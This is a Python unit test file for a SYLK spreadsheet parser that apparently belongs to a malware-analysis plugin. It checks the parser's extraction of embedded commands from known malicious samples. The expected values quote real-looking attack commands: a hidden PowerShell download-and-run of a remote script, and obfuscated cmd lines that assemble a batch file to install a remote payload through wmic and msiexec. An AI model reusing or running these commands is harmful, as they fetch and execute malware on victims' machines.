import unittest

from azul_runner.test_utils import FileManager

from azul_plugin_office.mssylk import Sylk


class TestSylk(unittest.TestCase):
    def test_sylk_cmd(self):
        fm = FileManager()
        # Malicious SYLK file with embedded command.
        b = fm.download_file_bytes("cabb190a05e7381e07c42e37f01c1eec8b0c5323d5c5633c61e44df90d905c9e")
        slk = Sylk(content=b)
        self.assertTrue(slk.is_sylk)
        self.assertEqual(
            slk.commands,
            [
                {
                    "function": "CMD",
                    "param": "'\"/c c:\\windows\\system32\\rundll32.exe Shell32.DLL,ShellExec_RunDLL cmd /c powershell.exe -exec bypass -w 1 -c (New-Object System.Net.WebClient).DownloadFile(''http://tools.newsrental.net/jsxlhlwdg/pxxas/'',''%temp%\\cromin.ps1'');;%temp%\\cromin.ps1\"'",
                }
            ],
        )
        self.assertEqual(
            slk.normalised,
            [
                "/c c:\\windows\\system32\\rundll32.exe shell32.dll,shellexec_rundll cmd /c powershell.exe -exec bypass -w 1 -c (new-object system.net.webclient).downloadfile('http://tools.newsrental.net/jsxlhlwdg/pxxas/','%temp%\\cromin.ps1');;%temp%\\cromin.ps1"
            ],
        )
        self.assertEqual(slk.urls, ["http://tools.newsrental.net/jsxlhlwdg/pxxas/"])

    def test_sylk_exec(self):
        fm = FileManager()
        # Malicious sylk file.
        b = fm.download_file_bytes("3a7b76b0ffbea4aab166c1ab4f3f4cbe6324da34cc6370abfbe19af20e259d59")
        slk = Sylk(content=b)
        self.assertTrue(slk.is_sylk)
        self.assertEqual(
            slk.commands,
            [
                {
                    "function": "EXEC",
                    "param": '"Cmd.exe /c echo|SEt /p=""@echo off&wm^ic pro^c^es^s c^a^ll cr^eat^e \'Ms"">%temp%\\fRnFq.bat"',
                },
                {
                    "function": "EXEC",
                    "param": '"Cmd.exe /c @echo off&pi^n^g 54 -n 1&echo|set /p=""iexec /ihttp^:^/^/^linux"">>%temp%\\fRnFq.bat"',
                },
                {
                    "function": "EXEC",
                    "param": '"cmd.exe /c @echo off&pi^n^g 54 -n 3&echo|s^et /p=""gundem.com/cat.php "">>%temp%\\fRnFq.bat"',
                },
                {
                    "function": "EXEC",
                    "param": '"cmd.exe /c @echo off&pi^n^g 54 -n 5&echo|set /p="" ^/q\'"">>%temp%\\fRnFq.bat&%temp%\\fRnFq.bat"',
                },
            ],
        )
        self.assertEqual(
            slk.normalised,
            [
                'cmd.exe /c echo|set /p=""@echo off&wmic process call create \'ms"">%temp%\\frnfq.bat',
                'cmd.exe /c @echo off&ping 54 -n 1&echo|set /p=""iexec /ihttp://linux"">>%temp%\\frnfq.bat',
                'cmd.exe /c @echo off&ping 54 -n 3&echo|set /p=""gundem.com/cat.php "">>%temp%\\frnfq.bat',
                'cmd.exe /c @echo off&ping 54 -n 5&echo|set /p="" /q\'"">>%temp%\\frnfq.bat&%temp%\\frnfq.bat',
            ],
        )
        self.assertEqual(
            slk.urls,
            [
                # not much we can do without more interpretation of shell commands
                "http://linux",
            ],
        )

    def test_non_sylk(self):
        b = b"Some;Random;Other;Text\r\nYes,Non,Maybe\r\n"
        slk = Sylk(content=b)
        self.assertFalse(slk.is_sylk)
